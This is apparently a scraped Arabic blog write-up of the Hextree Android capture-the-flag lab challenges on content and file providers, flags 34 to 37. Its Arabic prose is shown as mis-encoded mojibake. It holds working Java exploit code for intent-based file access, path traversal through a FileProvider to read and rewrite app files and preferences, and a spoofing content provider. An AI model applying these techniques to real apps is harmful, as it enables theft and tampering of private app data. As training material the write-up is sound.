34 # ÿ™ÿ≠ŸÑŸäŸÑ ÿßŸÑŸÉŸàÿØ # \u0026lt;activity android:name=\u0026#34;io.hextree.attacksurface.activities.Flag34Activity\u0026#34; android:exported=\u0026#34;true\u0026#34;/\u0026gt; ÿßŸÑŸÄ activity ŸÖÿµÿØŸëÿ± ŸäÿπŸÜŸä ŸÜŸÇÿØÿ± ŸÜÿ™ŸÅÿßÿπŸÑ ŸÖÿπÿßŸá ŸÖŸÜ ÿßŸÑŸÄ app ÿ®ÿ™ÿßÿπŸÜÿß\npublic void onCreate(Bundle bundle) { super.onCreate(bundle); String stringExtra = getIntent().getStringExtra(\u0026#34;filename\u0026#34;); if (stringExtra != null) { prepareFlag(this, stringExtra); Uri uriForFile = FileProvider.getUriForFile(this, \u0026#34;io.hextree.files\u0026#34;, new File(getFilesDir(), stringExtra)); Intent intent = new Intent(); intent.setData(uriForFile); intent.addFlags(3); setResult(0, intent); return; } Uri uriForFile2 = FileProvider.getUriForFile(this, \u0026#34;io.hextree.files\u0026#34;, new File(getFilesDir(), \u0026#34;secret.txt\u0026#34;)); Intent intent2 = new Intent(); intent2.setData(uriForFile2); intent2.addFlags(3); setResult(-1, intent2); } void prepareFlag(Context context, String str) { if (str.contains(\u0026#34;flag34.txt\u0026#34;) \u0026amp;\u0026amp; new File(getFilesDir(), str).exists()) { LogHelper logHelper = new LogHelper(context); logHelper.addTag(\u0026#34;file-provider\u0026#34;); logHelper.addTag(\u0026#34;flag34\u0026#34;); Utils.writeFile(this, \u0026#34;flags/flag34.txt\u0026#34;, logHelper.appendLog(FLAG)); } } ŸÑŸÖÿß Ÿäÿ≥ÿ™ŸÑŸÖ intent ÿ®Ÿäÿ¥ŸäŸÉ ÿπŸÑŸâ string data ÿ™ÿ≠ÿ™ ÿßÿ≥ŸÖ filename ŸàŸÑŸà nullÿå uri ŸÖÿ≠ÿØÿØ ŸÖÿ≥ÿ®ŸÇÿßŸã ŸÑŸÖŸÑŸÅ ÿ®Ÿäÿ™ÿ≥ÿ™ÿÆÿØŸÖ content://io.hextree.files/secret.txt ŸàŸÑŸà ŸÅŸäŸá dataÿå ÿßŸÑŸÄ uri ŸáŸäÿ™ÿπŸÖŸÑ ŸÖÿπ ÿßŸÑŸÄ authority ŸàÿßŸÑÿßÿ≥ŸÖ ÿßŸÑŸÑŸä ÿØÿÆŸÑŸÜÿßŸá. ÿ®ÿ≥ ÿ•ÿ≠ŸÜÿß ÿπÿßŸäÿ≤ŸäŸÜ ÿ•ŸäŸáÿü ÿßŸÑŸÄ method ÿßŸÑŸÑŸä ÿ®ÿ™ÿ≠ÿ∂ÿ± ÿßŸÑŸÄ flag ÿ®ÿ™ŸÇÿ™ÿ±ÿ≠ ÿ•ŸÜŸáÿß ÿ®ÿ™ÿßÿÆÿØ ÿßŸÑŸÄ flag ŸÖŸÜ ŸÖŸÉÿßŸÜ Ÿàÿ™ŸÉÿ™ÿ®Ÿá ŸÅŸä flags/flag34.txt\nÿßŸÑÿ≠ŸÑ # ŸÑÿßÿ≤ŸÖ ŸÜŸàÿµŸÑ ŸÑŸÄ flags/flag34.txt Ÿàÿπÿ¥ÿßŸÜ ŸÉÿØŸá ŸáŸÜÿ∂ŸäŸÅŸá ÿ™ÿ≠ÿ™ filename Ÿàÿ®ŸÖÿß ÿ•ŸÜ ŸÅŸäŸá result ÿ®Ÿäÿ™ÿ≠ÿ∑ ŸÅŸáŸÜÿ≥ÿ™ÿÆÿØŸÖ startActivityForResult()\nIntent intent = new Intent(); intent.putExtra(\u0026#34;filename\u0026#34;,\u0026#34;flags/flag34.txt\u0026#34;); // ŸÑŸà ÿπÿßŸäÿ≤ secret ŸÖÿßÿ™ÿ≥ÿ™ÿÆÿØŸÖŸáŸàÿ¥ intent.setComponent(new ComponentName(\u0026#34;io.hextree.attacksurface\u0026#34;, \u0026#34;io.hextree.attacksurface.activities.Flag34Activity\u0026#34;)); startActivityForResult(intent,1); if (requestCode == 1) { Log.d(\u0026#34;Hextree\u0026#34;,\u0026#34;URI: \u0026#34;+ data.getData().toString()); try { InputStream inputStream = getContentResolver().openInputStream(data.getData()); BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream)); String line ; while ((line = reader.readLine()) != null) { Log.d(\u0026#34;File\u0026#34;, \u0026#34;[*]\u0026#34; + line); } } catch (FileNotFoundException e) { throw new RuntimeException(e); } catch (IOException e) { throw new RuntimeException(e); } } Flag 35 # ÿ™ÿ≠ŸÑŸäŸÑ ÿßŸÑŸÉŸàÿØ # \u0026lt;provider android:name=\u0026#34;io.hextree.attacksurface.providers.Flag35FileProvider\u0026#34; android:exported=\u0026#34;false\u0026#34; android:authorities=\u0026#34;io.hextree.root\u0026#34; android:grantUriPermissions=\u0026#34;true\u0026#34;\u0026gt; \u0026lt;meta-data android:name=\u0026#34;android.support.FILE_PROVIDER_PATHS\u0026#34; android:resource=\u0026#34;@xml/rootpaths\u0026#34;/\u0026gt; \u0026lt;/provider\u0026gt; ÿßŸÑŸÄ provider ŸÖÿ¥ ŸÖÿ™ÿßÿ≠ ŸÜŸÉŸÑŸÖŸá ŸÖÿ®ÿßÿ¥ÿ± ÿ®ÿ≥ ÿπŸÜÿØŸá uri permissions ŸàÿßŸÑŸÄ authority ÿ®ÿ™ÿßÿπŸá io.hextree.root ŸàŸÅŸäŸá paths ŸÖÿ≠ÿØÿØÿ© ŸÅŸä ŸÖŸÉÿßŸÜ ŸÖÿß\n\u0026lt;paths\u0026gt; \u0026lt;root-path name=\u0026#34;root_files\u0026#34; path=\u0026#34;/\u0026#34;/\u0026gt; \u0026lt;/paths\u0026gt; ŸäÿπŸÜŸä ÿßŸÑŸÄ root directory (ÿßŸÑŸÖŸÑŸÅ ÿßŸÑÿ±Ÿäÿ¶Ÿäÿ≥Ÿä ÿßŸÑŸäÿ®ÿ™ÿØŸä ÿßŸÑÿ™ÿ≠ÿ±ŸÉ ŸÖŸÜŸá) ŸÑŸÑŸÄ provider ÿØŸá ŸáŸà ÿßŸÑŸÄ root directory / ŸàŸÑŸá ÿßÿ≥ŸÖ root_files\n\u0026lt;activity android:name=\u0026#34;io.hextree.attacksurface.activities.Flag34Activity\u0026#34; android:exported=\u0026#34;true\u0026#34;/\u0026gt; public void onCreate(Bundle bundle) { super.onCreate(bundle); String stringExtra = getIntent().getStringExtra(\u0026#34;filename\u0026#34;); if (stringExtra != null) { prepareFlag(this, stringExtra); Uri uriForFile = FileProvider.getUriForFile(this, \u0026#34;io.hextree.root\u0026#34;, new File(getFilesDir(), stringExtra)); Intent intent = new Intent(); intent.setData(uriForFile); intent.addFlags(3); setResult(0, intent); return; } Uri uriForFile2 = FileProvider.getUriForFile(this, \u0026#34;io.hextree.root\u0026#34;, new File(getFilesDir(), \u0026#34;secret.txt\u0026#34;)); Intent intent2 = new Intent(); intent2.setData(uriForFile2); intent2.addFlags(3); setResult(-1, intent2); } void prepareFlag(Context context, String str) { if (str.contains(\u0026#34;flag35.txt\u0026#34;) \u0026amp;\u0026amp; new File(getFilesDir(), str).exists()) { LogHelper logHelper = new LogHelper(context); logHelper.addTag(\u0026#34;flag35\u0026#34;); logHelper.addTag(\u0026#34;root-provider\u0026#34;); Utils.writeFile2(this, \u0026#34;flag35.txt\u0026#34;, logHelper.appendLog(FLAG)); } } } ÿßŸÑ activity ÿ®Ÿäÿ™ÿπÿßŸÖŸÑ ŸÖÿπ ŸÖÿ¥ÿßÿ±ŸÉÿ© ÿßŸÑŸÖŸÑŸÅÿßÿ™ ÿπÿ®ÿ± FileProvider ŸÑŸÖÿß ÿßŸÑÿ£ŸàŸÑ ÿ®Ÿäÿ¥ŸäŸÉ ÿ•ÿ∞ÿß intent extra ÿßÿ≥ŸÖŸá \u0026ldquo;filename\u0026rdquo; ŸÉÿßŸÜ ŸÖŸàÿ¨ŸàÿØ. ŸÑŸà ÿ¢Ÿáÿå ÿ®Ÿäÿ¥ÿ∫ŸÑ prepareFlag() ŸÖÿπ ÿßŸÑŸÄ filename ÿØŸáÿå ŸäŸÜÿ¥ÿ¶ URI ŸÑŸÑŸÖŸÑŸÅ ÿ®ÿßÿ≥ÿ™ÿÆÿØÿßŸÖ FileProviderÿå ŸäŸÜÿ¥ÿ¶ intent ŸÖÿπ ÿßŸÑŸÄ URI ÿØŸáÿå Ÿäÿ≠ÿ∑ flagsÿå ŸàŸäÿ±ÿ¨ÿπ result code ÿ®ŸÄ 0 (ŸÜÿ¨ÿßÿ≠).\nÿßŸÑŸÄ prepareFlag() method ÿ®Ÿäÿ¥ŸäŸÉ ÿ•ÿ∞ÿß ÿßŸÑŸÄ filename ŸáŸà \u0026ldquo;flag35.txt\u0026rdquo; ŸàŸÑŸà ÿßŸÑŸÖŸÑŸÅ ŸÖŸàÿ¨ŸàÿØ. ŸÑŸà ŸÉÿØŸáÿå ÿ®Ÿäÿ≥ÿ¨ŸÑ tags ŸàŸäŸÉÿ™ÿ® flag ŸÅŸä ÿßŸÑŸÖŸÑŸÅ.\nŸÑŸà ŸÖŸÅŸäÿ¥ filename ÿßÿ™ŸÇÿØŸÖ (stringExtra ŸáŸà null) ÿ®Ÿäÿ≥ÿ™ÿÆÿØŸÖ \u0026ldquo;secret.txt\u0026rdquo; ÿßŸÅÿ™ÿ±ÿßÿ∂ŸäÿßŸãÿå ŸäŸÜÿ¥ÿ¶ URI ŸÑŸÑŸÖŸÑŸÅ ÿØŸáÿå ŸäŸÜÿ¥ÿ¶ intent ŸÖÿπ ÿßŸÑŸÄ URI ÿØŸáÿå Ÿäÿ≠ÿ∑ flagsÿå ŸàŸäÿ±ÿ¨ÿπ result code ÿ®ŸÄ -1 (ŸÅÿ¥ŸÑ ÿ£Ÿà default case).\nŸÜŸÇÿØÿ± ŸÜÿ®ÿπÿ™ intent ŸàŸáŸÜÿß ÿ®ŸäÿØŸàÿ± ÿπŸÑŸâ filename Ÿàÿ®ÿπÿØŸäŸÜ Ÿäÿ≠ÿ∂ÿ± ÿßŸÑŸÄ flag ŸÅŸä ŸÖŸÑŸÅ flag35.txt\nÿßŸÑÿ≠ŸÑ # ŸÑŸà ŸÜÿ¥ŸàŸÅ ÿßŸÑŸÄ uri ÿßŸÑŸÑŸä ŸáŸäÿ™ÿ≥ÿ™ÿÆÿØŸÖ ŸÑŸÑŸàÿµŸàŸÑ ŸÑŸÄ secret.txt URI: content://io.hextree.root/root_files/data/data/io.hextree.attacksurface/files/secret.txt\nŸà ŸÜÿ¨ÿ±ÿ® ÿ∑ŸÑÿ® ÿ®ŸÄ intent.putExtra(\u0026quot;filename\u0026quot;,\u0026quot;flag35.txt\u0026quot;) URI: content://io.hextree.root/root_files/data/data/io.hextree.attacksurface/files/flag35.txt\nÿ•ÿ≠ŸÜÿß ÿ®ŸÜÿØŸàÿ± ÿ¨Ÿàÿß ŸÖÿ¨ŸÑÿØ filesÿü ŸÅÿπÿ¥ÿßŸÜ ŸÜÿÆÿ±ÿ¨ ŸÖŸÜ ÿßŸÑŸÖŸÑŸÅ ŸÜŸÇÿØÿ± ÿ≤Ÿä ŸÖÿß ÿ®ŸÜÿπŸÖŸÑ ÿπÿßÿØÿ© ŸÅŸä ÿ£Ÿä terminalÿå ŸÜÿßÿÆÿØ ÿÆÿ∑Ÿàÿ© ŸÑŸàÿ±ÿß ÿ®ÿßÿ≥ÿ™ÿÆÿØÿßŸÖ ..\nIntent intent = new Intent(); intent.putExtra(\u0026#34;filename\u0026#34;,\u0026#34;../flag35.txt\u0026#34;); // ŸÑŸà ÿπÿßŸäÿ≤ secret ŸÖÿßÿ™ÿ≥ÿ™ÿÆÿØŸÖŸáŸàÿ¥ intent.setComponent(new ComponentName(\u0026#34;io.hextree.attacksurface\u0026#34;, \u0026#34;io.hextree.attacksurface.activities.Flag35Activity\u0026#34;)); startActivityForResult(intent,1); if (requestCode == 1) { Log.d(\u0026#34;Hextree\u0026#34;,\u0026#34;URI: \u0026#34;+ data.getData().toString()); try { InputStream inputStream = getContentResolver().openInputStream(data.getData()); BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream)); String line ; while ((line = reader.readLine()) != null) { Log.d(\u0026#34;File\u0026#34;, \u0026#34;[*]\u0026#34; + line); } } catch (FileNotFoundException e) { throw new RuntimeException(e); } catch (IOException e) { throw new RuntimeException(e); } } Ÿàÿ®ÿπÿØŸäŸÜ ÿßÿ∂ÿ∫ÿ∑ done Ÿàÿ¥ŸàŸÅ ÿßŸÑÿ≥ÿ≠ÿ±\nFlag 36 # ÿ™ÿ≠ŸÑŸäŸÑ ÿßŸÑŸÉŸàÿØ # if (Flag36Preferences.getBoolean(\u0026#34;solved\u0026#34;, false)) { this.f.addTag(Flag36Preferences.class); success(this); } else { Log.i(\u0026#34;Flag36\u0026#34;, \u0026#34;not solved\u0026#34;); } ŸÑŸà ÿßŸÑŸÄ shared preferences ÿßÿ≥ŸÖŸáÿß Flag36Preferences ŸàŸÑŸà ÿπŸÜÿØŸáÿß ŸÇŸäŸÖÿ© ÿßÿ≥ŸÖŸáÿß solved ŸÖÿ≠ÿ∑Ÿàÿ∑ÿ© ÿπŸÑŸâ true ŸÜÿ¨Ÿäÿ® ÿßŸÑŸÄ flag ÿ®ÿ™ÿßÿπŸÜÿß ÿ®ÿ≥ ÿ•ŸäŸá ŸáŸà ÿßŸÑŸÄ shared preference ÿØŸáÿü\n[!info] ÿßŸÑŸÄ SharedPreferences ŸáŸà object ÿ®Ÿäÿ¥ÿßŸàÿ± ÿπŸÑŸâ ŸÖŸÑŸÅ ŸÅŸäŸá key-value pairs (ŸÖŸÅÿ™ÿßÿ≠ ÿßŸà ÿπŸÑÿßŸÖŸá Ÿà ÿßŸÑŸÇŸäŸÖÿ© ÿßŸÑÿ®ÿ™ÿØŸÑ ÿπŸÑŸäŸáÿß) Ÿàÿ®ŸäÿØŸä methods ÿ®ÿ≥Ÿäÿ∑ÿ© ÿπÿ¥ÿßŸÜ ŸÜŸÇÿ±ÿ£ ŸàŸÜŸÉÿ™ÿ® ŸÅŸäŸáŸÖ. ŸÉŸÑ ŸÖŸÑŸÅ SharedPreferences ÿ®Ÿäÿ™ÿπÿßŸÖŸÑ ŸÖÿπÿßŸá ÿßŸÑŸÄ framework ŸàŸÜŸÇÿØÿ± ŸÜÿÆŸÑŸäŸá private ÿ£Ÿà ÿßŸä ÿ≠ÿØ Ÿäÿ≥ÿ™ÿÆÿØŸÖÿ© shared . Ÿà ÿ®Ÿäÿ™ÿ≠ŸÅÿ∏ ÿ®ÿµŸäÿ∫ÿ© xml\n\u0026hellip; ŸÖÿßÿ∞ÿß ÿ®ÿπÿØÿü\nÿßŸÑÿ≠ŸÑ # ŸÅŸä flag35 ŸÖÿ¥ ÿ®ÿ≥ ÿπŸÜÿØŸÜÿß permission ŸÑŸÑŸÇÿ±ÿßÿ°ÿ© ŸÑÿß ŸàŸÉŸÖÿßŸÜ ŸÑŸÑŸÉÿ™ÿßÿ®ÿ©ÿå Ÿàÿ®ŸÖÿß ÿ•ŸÜ ÿßŸÑŸÄ provider ÿØŸá ÿ®Ÿäÿ≥ÿ™ÿÆÿØŸÖ ÿπŸÜŸàÿßŸÜ root ŸÜŸÇÿØÿ± ŸÜÿ±Ÿàÿ≠ ŸÑŸÖŸÉÿßŸÜ ÿßŸÑŸÄ shared preference ÿØŸá ŸàŸÜŸÅÿ™ÿ≠ ŸàŸÜÿπÿØŸÑ ÿßŸÑŸÖŸÑŸÅ Ÿàÿ®ÿπÿØŸäŸÜ ŸÑÿßÿ≤ŸÖ ŸÜŸÇŸÅŸÑ ÿßŸÑŸÄ app ŸàŸÜŸÅÿ™ÿ≠Ÿá ÿ™ÿßŸÜŸä ÿπÿ¥ÿßŸÜ ÿßŸÑÿ™ÿ∫ŸäŸäÿ±ÿßÿ™ ÿ™ÿ®ÿßŸÜ\nIntent intent = new Intent(); intent.putExtra(\u0026#34;filename\u0026#34;,\u0026#34;../shared_prefs/Flag36Preferences.xml\u0026#34;); // ŸÑŸà ÿπÿßŸäÿ≤ secret ŸÖÿßÿ™ÿ≥ÿ™ÿÆÿØŸÖŸáŸàÿ¥ intent.setComponent(new ComponentName(\u0026#34;io.hextree.attacksurface\u0026#34;, \u0026#34;io.hextree.attacksurface.activities.Flag35Activity\u0026#34;)); startActivityForResult(intent,2); if (requestCode == 2) { Log.d(\u0026#34;Hextree\u0026#34;,\u0026#34;URI: \u0026#34;+ data.getData().toString()); try { InputStream inputStream = getContentResolver().openInputStream(data.getData()); StringBuilder stringBuilder = new StringBuilder(); BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream)); String line; while ((line = reader.readLine()) != null) { Log.d(\u0026#34;File\u0026#34;, \u0026#34;[*]\u0026#34; + line); if (line.contains(\u0026#34;false\u0026#34;)) { Log.d(\u0026#34;File\u0026#34;, \u0026#34;[*] /* ŸÇŸàÿßŸÜŸäŸÜ ÿ¨ÿØŸäÿØÿ© Ÿäÿß ÿµÿßÿ≠ÿ®Ÿä *\\\\\u0026#34;); line = line.replace(\u0026#34;false\u0026#34;, \u0026#34;true\u0026#34;); Log.d(\u0026#34;File\u0026#34;, \u0026#34;[*]\u0026#34; + line); } stringBuilder.append(line).append(\u0026#34;\\n\u0026#34;); } reader.close(); // ŸÉÿ™ÿßÿ®ÿ© ÿßŸÑŸÖÿ≠ÿ™ŸàŸâ ÿßŸÑŸÖÿπÿØŸÑ ŸÅŸä ÿßŸÑŸÖŸÑŸÅ ÿ™ÿßŸÜŸä OutputStream outputStream = getContentResolver().openOutputStream(data.getData()); outputStream.write(stringBuilder.toString().getBytes()); outputStream.close(); } catch (FileNotFoundException e) { throw new RuntimeException(e); } catch (IOException e) { throw new RuntimeException(e); } } Flag 37 # ÿ™ÿ≠ŸÑŸäŸÑ ÿßŸÑŸÉŸàÿØ # @Override protected void onCreate(Bundle bundle) { super.onCreate(bundle); this.f = new LogHelper(this); Uri data = getIntent().getData(); if (data == null) { return; } try (Cursor cursor = getContentResolver().query(data, null, null, null, null)) { if (cursor == null || !cursor.moveToFirst()) { return; } // ÿßÿ≥ÿ™ÿÆÿ±ÿßÿ¨ metadata ÿßŸÑŸÖŸÑŸÅ String fileName = cursor.getString(cursor.getColumnIndex(\u0026#34;_display_name\u0026#34;)); long fileSize = cursor.getLong(cursor.getColumnIndex(\u0026#34;_size\u0026#34;)); this.f.addTag(fileSize); this.f.addTag(fileName); // ÿ¥ŸäŸÉ ÿ•ÿ∞ÿß ŸÉÿßŸÜ ÿßŸÑŸÄ flag file ÿßŸÑÿµÿ≠ if (!\u0026#34;../flag37.txt\u0026#34;.equals(fileName) || fileSize != 1337) { Log.i(\u0026#34;Flag37\u0026#34;, \u0026#34;ÿßÿ≥ŸÖ ÿßŸÑŸÖŸÑŸÅ \u0026#39;\u0026#34; + fileName + \u0026#34;\u0026#39; ÿ£Ÿà ÿßŸÑÿ≠ÿ¨ŸÖ \u0026#39;\u0026#34; + fileSize + \u0026#34;\u0026#39; ŸÖÿ¥ ŸÖÿ∑ÿßÿ®ŸÇ\u0026#34;); return; } // ŸÇÿ±ÿßÿ°ÿ© ŸÖÿ≠ÿ™ŸàŸâ ÿßŸÑŸÖŸÑŸÅ try (InputStream inputStream = getContentResolver().openInputStream(data); BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream))) { StringBuilder fileContent = new StringBuilder(); String line; while ((line = reader.readLine()) != null) { fileContent.append(line); } this.f.addTag(fileContent.toString()); if (\u0026#34;give flag\u0026#34;.equals(fileContent.toString())) { success(this); } else { Log.i(\u0026#34;Flag37\u0026#34;, \u0026#34;ŸÖÿ≠ÿ™ŸàŸâ ÿßŸÑŸÖŸÑŸÅ \u0026#39;\u0026#34; + fileContent + \u0026#34;\u0026#39; ŸÖÿ¥ \u0026#39;give flag\u0026#39;\u0026#34;); } } } catch (Exception e) { Log.e(\u0026#34;Flag37\u0026#34;, \u0026#34;ÿÆÿ∑ÿ£ ŸÅŸä ŸÖÿπÿßŸÑÿ¨ÿ© ÿßŸÑŸÖŸÑŸÅ\u0026#34;, e); } } ŸáŸÜÿß ÿßŸÑŸÄ activity ÿ®Ÿäÿ¨Ÿäÿ® intent ŸàŸäÿßÿÆÿØ ÿßŸÑŸÄ URI ÿßŸÑŸÑŸä ŸÅŸäŸá ŸàŸäÿ≥ÿ™ÿÆÿØŸÖŸá ÿπÿ¥ÿßŸÜ Ÿäÿ¥ÿ∫ŸÑ providerÿå Ÿàÿ®ÿπÿØŸäŸÜ Ÿäÿ¥ŸäŸÉ ÿ•ÿ∞ÿß ÿßŸÑŸÖŸÑŸÅ ÿßÿ≥ŸÖŸá \u0026ldquo;../flag37.txt\u0026rdquo; Ÿàÿ≠ÿ¨ŸÖŸá ÿ®ÿßŸÑÿ∂ÿ®ÿ∑ 1337 bytes ŸÑŸà true ÿ®ŸäŸÅÿ™ÿ≠ input stream (ÿ∑ÿ±ŸäŸÇ ÿ™ŸÇÿØÿ± ÿ™ÿ≥ÿ™ŸÇÿ®ŸÑ ÿ®ŸäŸá ÿ®ŸäÿßŸÜÿßÿ™) ÿπÿ¥ÿßŸÜ ŸäŸÇÿ±ÿ£ ÿßŸÑŸÖŸÑŸÅ ŸàŸäŸÇÿ±ÿ£ ŸÉŸÑ ŸÖÿ≠ÿ™ŸàŸâ ÿßŸÑŸÖŸÑŸÅ ŸÅŸä StringBuilder ŸàŸäÿ¥ŸäŸÉ ÿ•ÿ∞ÿß ÿßŸÑŸÖÿ≠ÿ™ŸàŸâ ÿ®ÿßŸÑÿ∂ÿ®ÿ∑ \u0026quot;give flag\u0026quot; ŸÑŸà ŸÖÿ∑ÿßÿ®ŸÇÿå ÿ®Ÿäÿ¥ÿ∫ŸÑ success() ŸàŸÑŸà ŸÑÿ£ÿå ÿ®Ÿäÿ≥ÿ¨ŸÑ ÿ•ŸÜ ÿßŸÑŸÖÿ≠ÿ™ŸàŸâ ŸÖÿ¥ ŸÖÿ∑ÿßÿ®ŸÇ\nÿßŸÑÿ≠ŸÑ # ŸáŸÜÿß ŸÑÿßÿ≤ŸÖ ŸÜŸÜÿ¥ÿ¶ content provider ÿ®ÿ™ÿßÿπŸÜÿß ŸÖÿπ ÿßŸÑŸÖÿ™ÿ∑ŸÑÿ®ÿßÿ™ Ÿàÿ®ÿπÿØŸäŸÜ ŸÜÿ∂ÿ∫ÿ∑ ÿπŸÑŸâ activity ÿßŸÑŸÄ flag ŸÖŸÜ ÿßŸÑŸÄ app\nÿßŸÑŸÄ Flag 37 activity ÿ®ŸäÿπŸÖŸÑ ÿßŸÑŸÅÿ≠Ÿàÿµÿßÿ™ ÿßŸÑŸÖÿ≠ÿØÿØÿ© ÿØŸä:\nÿ®ŸäÿπŸÖŸÑ query ŸÑŸÄ content provider ÿπÿ®ÿ± ÿßŸÑŸÄ URI ŸÖŸÜ ÿßŸÑŸÄ intent ÿ®Ÿäÿ≥ÿ™ÿÆÿ±ÿ¨ metadata ŸÖŸÜ ÿßŸÑŸÄ cursor: ÿ£ÿπŸÖÿØÿ© _display_name Ÿà _size ÿ®Ÿäÿ™ÿ£ŸÉÿØ ŸÖŸÜ ÿßÿ≥ŸÖ ÿßŸÑŸÖŸÑŸÅ ŸÑÿßÿ≤ŸÖ ŸäŸÉŸàŸÜ ÿ®ÿßŸÑÿ∂ÿ®ÿ∑ \u0026quot;flag37.txt/..\u0026quot; ÿ®Ÿäÿ™ÿ£ŸÉÿØ ŸÖŸÜ ÿ≠ÿ¨ŸÖ ÿßŸÑŸÖŸÑŸÅ ŸÑÿßÿ≤ŸÖ ŸäŸÉŸàŸÜ ÿ®ÿßŸÑÿ∂ÿ®ÿ∑ 1337 bytes ÿ®ŸäŸÇÿ±ÿ£ ŸÖÿ≠ÿ™ŸàŸâ ÿßŸÑŸÖŸÑŸÅ ÿ®ÿßÿ≥ÿ™ÿÆÿØÿßŸÖ openInputStream() ÿ®Ÿäÿ¥ŸäŸÉ ÿ•ÿ∞ÿß ÿßŸÑŸÖÿ≠ÿ™ŸàŸâ Ÿäÿ≥ÿßŸàŸä ÿ®ÿßŸÑÿ∂ÿ®ÿ∑ \u0026quot;give flag\u0026quot; ÿßŸÑŸÄ custom content provider ÿßŸÑŸÑŸä ŸáŸäŸÄ:\nŸäÿ±ÿ¨ÿπ ÿßŸÑŸÄ metadata ÿßŸÑÿµÿ≠ ŸÅŸä method ÿßŸÑŸÄ query() ŸäÿØŸä ŸÖÿ≠ÿ™ŸàŸâ ÿßŸÑŸÖŸÑŸÅ ÿ®ÿßŸÑÿ∂ÿ®ÿ∑ ÿπÿ®ÿ± openInputStream() ÿ£Ÿà openFile() Ÿäÿ™ÿ£ŸÉÿØ ÿ•ŸÜ ÿßŸÑŸÖÿ≠ÿ™ŸàŸâ ÿ®ÿßŸÑÿ∂ÿ®ÿ∑ 1337 bytes (ŸÖÿπ padding) \u0026lt;provider android:name=\u0026#34;.AttackProvider\u0026#34; android:authorities=\u0026#34;ItsFadinG.github.io\u0026#34; android:enabled=\u0026#34;true\u0026#34; android:exported=\u0026#34;true\u0026#34;\u0026gt;\u0026lt;/provider\u0026gt; public class AttackProvider extends ContentProvider { public AttackProvider() { } @Override public Cursor query(Uri uri, String[] projection, String selection, String[] selectionArgs, String sortOrder) { Log.i(\u0026#34;AttackProvider\u0026#34;, \u0026#34;query(\u0026#34;+uri.toString()+\u0026#34;)\u0026#34;); MatrixCursor cursor = new MatrixCursor(new String[]{ OpenableColumns.DISPLAY_NAME, OpenableColumns.SIZE }); cursor.addRow(new Object[]{ \u0026#34;../flag37.txt\u0026#34;, 1337 }); return cursor; } @Override public ParcelFileDescriptor openFile(Uri uri, @NonNull String mode) throws FileNotFoundException { Log.i(\u0026#34;AttackProvider\u0026#34;, \u0026#34;openFile(\u0026#34; + uri.toString() + \u0026#34;)\u0026#34;); try { ParcelFileDescriptor[] pipe = ParcelFileDescriptor.createPipe(); ParcelFileDescriptor.AutoCloseOutputStream outputStream = new ParcelFileDescriptor.AutoCloseOutputStream(pipe[1]); new Thread(() -\u0026gt; { try { outputStream.write(\u0026#34;give flag\u0026#34;.getBytes()); outputStream.close(); } catch (IOException e) { Log.e(\u0026#34;AttackProvider\u0026#34;, \u0026#34;ÿÆÿ∑ÿ£ ŸÅŸä pipeToParcelFileDescriptor\u0026#34;, e); } }).start(); return pipe[0]; } catch (IOException e) { throw new FileNotFoundException(\u0026#34;ŸÖÿß ŸÇÿØÿ±ÿ¥ ŸäŸÅÿ™ÿ≠ pipe ŸÑŸÄ: \u0026#34; + uri.toString()); } } @Override public int delete(Uri uri, String selection, String[] selectionArgs) { Log.i(\u0026#34;AttackProvider\u0026#34;, \u0026#34;delete(\u0026#34;+uri.toString()+\u0026#34;)\u0026#34;); throw new UnsupportedOperationException(\u0026#34;ŸÑÿ≥Ÿá ŸÖÿ¥ ŸÖÿ™ÿπŸÖŸÑ\u0026#34;); } @Override public String getType(Uri uri) { Log.i(\u0026#34;AttackProvider\u0026#34;, \u0026#34;getType(\u0026#34;+uri.toString()+\u0026#34;)\u0026#34;); throw new UnsupportedOperationException(\u0026#34;ŸÑÿ≥Ÿá ŸÖÿ¥ ŸÖÿ™ÿπŸÖŸÑ\u0026#34;); } @Override public Uri insert(Uri uri, ContentValues values) { Log.i(\u0026#34;AttackProvider\u0026#34;, \u0026#34;insert(\u0026#34;+uri.toString()+\u0026#34;)\u0026#34;); throw new UnsupportedOperationException(\u0026#34;ŸÑÿ≥Ÿá ŸÖÿ¥ ŸÖÿ™ÿπŸÖŸÑ\u0026#34;); } @Override public boolean onCreate() { Log.i(\u0026#34;AttackProvider\u0026#34;, \u0026#34;onCreate()\u0026#34;); return true; } @Override public int update(Uri uri, ContentValues values, String selection, String[] selectionArgs) { Log.i(\u0026#34;AttackProvider\u0026#34;, \u0026#34;update(\u0026#34;+uri.toString()+\u0026#34;)\u0026#34;); throw new UnsupportedOperationException(\u0026#34;ŸÑÿ≥Ÿá ŸÖÿ¥ ŸÖÿ™ÿπŸÖŸÑ\u0026#34;); } } ","date":"30 ŸäŸàŸÑŸäŸà 2025","externalUrl":null,"permalink":"/superBLog/ar/posts/ctf/mobile/hex/hex_provider/","section":"Posts","summary":"","title":"ÿ™ÿ≠ÿØŸäÿßÿ™ HEX Tree Content \u0026 File providers","type":"posts"},{"content":"","date":"14 ŸäŸàŸÑŸäŸà 2025","externalUrl":null,"permalink":"/superBLog/ar/tags/broadcast/","section":"Tags","summary":"","title":"Broadcast","type":"tags"},{"content":" Flag 16 # ÿ™ÿ≠ŸÑŸäŸÑ ÿßŸÑŸÉŸàÿØ # \u0026lt;activity android:name=\u0026#34;io.hextree.attacksurface.activities.Flag16Activity\u0026#34; android:exported=\u0026#34;false\u0026#34;/\u0026gt; \u0026lt;/activity\u0026gt; \u0026lt;receiver android:name=\u0026#34;io.hextree.attacksurface.receivers.Flag16Receiver\u0026#34; android:enabled=\u0026#34;true\u0026#34; android:exported=\u0026#34;true\u0026#34;/\u0026gt; ÿ®ÿØÿßŸäÿ© ÿ∫Ÿäÿ± ŸÖÿ®ÿ¥ÿ±ÿ© \u0026gt;: ÿßŸÑŸÄ activity ŸÖÿ¥ exported ŸäÿπŸÜŸä ŸÖŸÜŸÇÿØÿ±ÿ¥ ŸÜÿ≥ÿ™ÿØÿπŸäŸá Ÿà ŸÜÿ™ÿπÿßŸÖŸÑ ŸÖÿπÿßŸá ÿ®ÿ¥ŸÉŸÑ ŸÖÿ®ÿßÿ¥ÿ±ÿå ÿ®ÿ≥ ÿßŸÑÿ≠ŸÖÿØ ŸÑŸÑŸá ŸÅŸä receiver ŸÖÿπŸÖŸàŸÑ.\nReceiver:\npublic static String FlagSecret = \u0026#34;give-flag-16\u0026#34;; public void onReceive(Context context, Intent intent) { if 